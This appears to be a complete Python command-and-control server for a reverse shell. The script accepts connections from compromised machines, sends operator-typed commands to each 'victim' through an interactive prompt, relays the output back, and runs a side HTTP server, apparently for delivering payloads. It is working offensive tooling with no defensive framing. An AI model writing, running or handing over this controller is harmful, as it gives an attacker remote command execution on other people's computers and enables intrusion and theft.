import socket
import socketserver
import http.server
import threading

# Function to start HTTP server
def http_server(PORT_HTTP):
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT_HTTP), handler) as httpd:
        print(f"HTTP server listening on port {PORT_HTTP}")
        httpd.serve_forever()

# Main function to handle the TCP server
def main():
    # Socket for the command-and-control server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    HOST = socket.gethostbyname(socket.gethostname())  # Change to the IP of your machine
    PORT = 1392
    PORT_HTTP = 8001

    # Bind and listen for incoming connections
    server.bind((HOST, PORT))
    server.listen(1)
    print("WELCOME TO THE BLIZZARD!!!")

    # Start the HTTP server in a separate thread
    t1 = threading.Thread(target=http_server, args=(PORT_HTTP,))
    t1.daemon = True  # Ensures the HTTP server thread will close when the main thread closes
    t1.start()
    print(f"HTTP server started on port {PORT_HTTP}")
    print(f"Listening on port {PORT}")

    while True:
        client, address = server.accept()
        print(f"WE GOT ONE: {address[0]}")

        # Receive and send commands to the client
        try:
            while True:
                command = input("Command on victim: ")
                if command.lower() == "exit":
                    print("Closing connection.")
                    break
                client.send(command.encode("utf-8"))
                response = client.recv(1024).decode("utf-8")
                print(response)
        except ConnectionResetError:
            print("Client disconnected.")
        finally:
            client.close()

if __name__ == "__main__":
    main()
